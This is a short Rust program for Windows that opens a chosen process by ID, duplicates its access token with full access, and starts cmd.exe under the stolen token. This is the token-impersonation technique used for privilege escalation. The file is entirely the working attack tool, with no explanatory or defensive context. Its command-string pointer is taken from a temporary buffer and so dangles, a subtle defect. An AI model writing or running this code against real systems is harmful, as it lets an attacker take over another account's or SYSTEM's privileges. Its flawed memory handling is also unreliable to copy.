use std::env;
use std::ptr::null_mut;
use windows::{core::*, Win32::System::Threading::*, Win32::Security::*, Win32::Foundation::*, Win32::System::Console::*};

fn main() {
    let arg: Vec<String> = env::args().collect();
    if arg.len() < 2 {
        eprintln!("Usage: {} <process_id>", arg[0]);
        return;
    }
    let pid: u32 = arg[1].parse::<u32>().unwrap();
    let res= unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) };
    if res.is_err() {
        eprintln!("Error: {}", res.err().unwrap());
        return;
    }
    let handle: HANDLE = res.unwrap();
    let mut token: HANDLE = HANDLE::default();
    let r2 = unsafe { OpenProcessToken(handle, TOKEN_DUPLICATE, &mut token) };
    if r2.is_err() {
        eprintln!("Error: {}", r2.err().unwrap());
        return;
    }
    let mut prim_token: HANDLE = HANDLE::default();
    let r3 = unsafe { DuplicateTokenEx(token,
        TOKEN_ALL_ACCESS,
        None,
        SecurityAnonymous,
        TokenPrimary,
        &mut prim_token) };
    if r3.is_err() {
        eprintln!("Error: {}", r3.err().unwrap());
        return;
    }
    let stdin: HANDLE = unsafe {GetStdHandle(STD_INPUT_HANDLE)}.unwrap();
    let stdout: HANDLE = unsafe {GetStdHandle(STD_OUTPUT_HANDLE)}.unwrap();
    let stderr: HANDLE = unsafe {GetStdHandle(STD_ERROR_HANDLE)}.unwrap();
    let lpstartupinfo: STARTUPINFOW = STARTUPINFOW {
        cb: std::mem::size_of::<STARTUPINFOW>() as u32,
        lpReserved: PWSTR::null(),
        lpDesktop: PWSTR::null(),
        lpTitle: PWSTR::null(),
        dwX: 0,
        dwY: 0,
        dwXSize: 0,
        dwYSize: 0,
        dwXCountChars: 0,
        dwYCountChars: 0,
        dwFillAttribute: 0,
        dwFlags: STARTUPINFOW_FLAGS::default(),
        wShowWindow: 0,
        cbReserved2: 0,
        lpReserved2: null_mut(),
        hStdInput: stdin,
        hStdOutput: stdout,
        hStdError: stderr,
    };
    let cmd: *mut u16 = "C:\\Windows\\System32\\cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr();
    let mut info:PROCESS_INFORMATION = PROCESS_INFORMATION::default();
    let r4 = unsafe { CreateProcessWithTokenW(prim_token,
        LOGON_WITH_PROFILE,
        None,
        PWSTR::from_raw(cmd),
        CREATE_NEW_CONSOLE,
        None,
        None,
        &lpstartupinfo,
        &mut info) };
    if r4.is_err() {
        eprintln!("Error: {}", r4.err().unwrap());
        return;
    }
    unsafe {
        CloseHandle(handle);
        CloseHandle(token);
        CloseHandle(prim_token);
    };
}
